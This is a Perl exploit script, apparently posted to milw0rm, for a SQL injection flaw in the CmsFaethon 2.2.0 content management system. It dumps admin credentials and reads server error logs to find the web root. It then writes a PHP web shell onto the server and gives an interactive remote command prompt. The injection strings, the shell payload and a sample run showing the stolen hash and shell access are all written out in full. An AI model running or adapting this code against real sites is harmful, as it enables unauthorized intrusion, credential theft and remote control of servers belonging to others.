#!/usr/bin/perl

# |----------------------------------------------------------------------------------------------------------------------------------|
# |                     INFORMATIONS                                                                                                 |
# |----------------------------------------------------------------------------------------------------------------------------------|
# |Web Application :    CmsFaethon 2.2.0 Ultimate                                                                                    |
# |Download        :    http://garr.dl.sourceforge.net/sourceforge/cmsfaethon/cmsfaethon-2.2.0-ultimate.zip                          |
# |----------------------------------------------------------------------------------------------------------------------------------|
# |Remote SQL Command Injection Exploit                                                                                              |
# |by Osirys                                                                                                                         |
# |osirys[at]autistici[dot]org                                                                                                       |
# |osirys.org                                                                                                                        |
# |Greets to: evilsocket, Fireshot, Todd and str0ke                                                                                  |
# |----------------------------------------------------------------------------------------------------------------------------------|
# |BUG [Sql Injection]
# |  p0c : /[path]/info.php?item=[sql_string]
# |SQL Injections used by this sploit :
# |[1] /path]/info.php?item=-2' union all select concat(username,0x3a,password),0 from f06_users order by '*
# |[2] /path]/info.php?item=-2' union all select load_file('lf'),0 order by '*
# |[3] /path]/info.php?item=-2' union all select 'content',0 into dumpfile 'file
# |----------------------------------------------------------------------------------------------------------------------------------|
# |This exploit just use a trick that came in my mind smocking a cigarette. It's just a SQL Injection vulnerability, but with this
# |trick can become a RCE vulnerability. A lot of people already know the into dumpfile mysql function, but this function needs the
# |path of the site in the server, so the attacker has to find this path to perform a RCE attack.
# |I just found a possible way to find this path. Making a HTTP GET request to a non existent file of the cms, this wrong request will
# |appear into error log files. So, just using then load_file() function on each possible path of error logs, when we will find the
# |right path, will appear error log's content, so we will be able to get the website path in the server just watching near the error
# |that came out after the request to a non existent file. Anyway, soon I will write a paper to talk about this trick.
# |It's just an experimental way to RCE by SQL. Can be emproved. A complete paper will arrive soon !
# |Coz to use this technique you need to know few things before :P
# |----------------------------------------------------------------------------------------------------------------------------------|

# -----------------------------------------------------------------------------------------------------------------------------------|
# Exploit in action [>!]
# -----------------------------------------------------------------------------------------------------------------------------------|
#  osirys[~]>$ perl p0w.txt http://localhost/cmsfaethon-2.0.4-ultimate/20_ultimate/
#
#   ---------------------------------
#         CmsFaethon Remote SQL
#             CMD Inj Sploit
#               by Osirys
#   ---------------------------------
#
# [*] Getting admin login details ..
# [$] User: admin
# [$] Pass: 5f4dcc3b5aa765d61d8327deb882cf99
# [*] Generating error through GET request ..
# [*] Cheeking Apache Error Log path ..
# [*] Error Log path found -> /var/log/httpd/error_log
# [*] Website path found -> /home/osirys/web/cmsfaethon-2.0.4-ultimate/20_ultimate/
# [*] Shell succesfully injected !
# [&] Hi my master, do your job now [!]

# shell[localhost]$> id
# uid=80(apache) gid=80(apache) groups=80(apache)
# shell[localhost]$> pwd
# /home/osirys/web/cmsfaethon-2.0.4-ultimate/20_ultimate
# shell[localhost]$> exit
# [-] Quitting ..
# osirys[~]>$
# -----------------------------------------------------------------------------------------------------------------------------------|


use IO::Socket;
use LWP::UserAgent;

my $host = $ARGV[0];
my $rand = int(rand 9) +1;

my @error_logs  =  qw(
                      /var/log/httpd/error.log
                      /var/log/httpd/error_log
                      /var/log/apache/error.log
                      /var/log/apache/error_log
                      /var/log/apache2/error.log
                      /var/log/apache2/error_log
                      /logs/error.log
                      /var/log/apache/error_log
                      /var/log/apache/error.log
                      /usr/local/apache/logs/error_log
                      /etc/httpd/logs/error_log
                      /etc/httpd/logs/error.log
                      /var/www/logs/error_log
                      /var/www/logs/error.log
                      /usr/local/apache/logs/error.log
                      /var/log/error_log
                      /apache/logs/error.log
                    );

my $php_c0de   =  "<?php echo \"st4rt\";if(get_magic_quotes_gpc()){ \$_GET".
                  "[cmd]=stripslashes(\$_GET[cmd]);}system(\$_GET[cmd]);?>";

($host) || help("-1");
cheek($host) == 1 || help("-2");
&banner;

$datas = get_input($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);

print "[*] Getting admin login details ..\n";

my $url = $host."/info.php?item=-2' union all select concat(0x64657461696C73,username,0x3a,password,0x64657461696C73),0 from f06_users order by '*";
my $re = get_req($url);
if ($re =~ /details(.+):(.+)details/) {
    $user = $1;
    $pass = $2;
    print "[\$] User: $user\n";
    print "[\$] Pass: $pass\n";
}
else {
    print "[-] Can't extract admin details\n\n";
}

print "[*] Generating error through GET request ..\n";

get_req($host."/osirys_log_test".$rand);

print "[*] Cheeking Apache Error Log path ..\n";

while (($log = <@error_logs>)&&($gotcha != 1)) {
    $tmp_path = $host."/info.php?item=-2' union all select load_file('".$log."'),0 order by '*";
    $re = get_req($tmp_path);
    if ($re =~ /File does not exist: (.+)\/osirys_log_test$rand/) {
        $site_path = $1."/";
        $gotcha = 1;
        print "[*] Error Log path found -> $log\n";
        print "[*] Website path found -> $site_path\n";
        &inj_shell;
    }
}

$gotcha == 1 || die "[-] Couldn't file error_log !\n";

sub inj_shell {
    my $attack  = $host."/info.php?item=-2' union all select '".$php_c0de."',0 into dumpfile '".$site_path."/1337.php";
    get_req($attack);
    my $test = get_req($host."/1337.php");
    if ($test =~ /st4rt/) {
        print "[*] Shell succesfully injected !\n";
        print "[&] Hi my master, do your job now [!]\n\n";
        $exec_path = $host."/shell.php";
        &exec_cmd;

    }
    else {
        print "[-] Shell not found \n[-] Exploit failed\n\n";
        exit(0);
    }
}

sub exec_cmd {
    $h0st !~ /www\./ || $h0st =~ s/www\.//;
    print "shell[$h0st]\$> ";
    $cmd = <STDIN>;
    $cmd !~ /exit/ || die "[-] Quitting ..\n";
    $exec_url = $host."/1337.php?cmd=".$cmd;
    my $re = get_req($exec_url);
    my $content = tag($re);
    if ($content =~ /st4rt(.+)0/) {
        my $out = $1;
        $out =~ s/\$/ /g;
        $out =~ s/\*/\n/g;
        chomp($out);
        print "$out\n";
        &exec_cmd;
    }
    else {
        $c++;
        $cmd =~ s/\n//;
        print "bash: ".$cmd.": command not found\n";
        $c < 3 || die "[-] Command are not executed.\n[-] Something wrong. Exploit Failed !\n\n";
        &exec_cmd;
    }

}

sub get_req() {
    $link = $_[0];
    my $req = HTTP::Request->new(GET => $link);
    my $ua = LWP::UserAgent->new();
    $ua->timeout(4);
    my $response = $ua->request($req);
    return $response->content;
}

sub cheek() {
    my $host = $_[0];
    if ($host =~ /http:\/\/(.*)/) {
        return 1;
    }
    else {
        return 0;
    }
}

sub get_input() {
    my $host = $_[0];
    $host =~ /http:\/\/(.*)/;
    $s_host = $1;
    $s_host =~ /([a-z.-]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st." ".$path;
    return $full_det;
}

sub tag() {
    my $string = $_[0];
    $string =~ s/ /\$/g;
    $string =~ s/\s/\*/g;
    return($string);
}

sub banner {
    print "\n".
          "  --------------------------------- \n".
          "        CmsFaethon Remote SQL       \n".
          "            CMD Inj Sploit          \n".
          "              by Osirys             \n".
          "  --------------------------------- \n\n";
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &banner;
        print "\n[-] Input data failed ! \n";
    }
    elsif ($error == -2) {
        &banner;
        print "\n[-] Bad hostname address !\n";
    }
    print "[*] Usage : perl $0 http://hostname/cms_path\n\n";
    exit(0);
}

# milw0rm.com [2009-02-13]
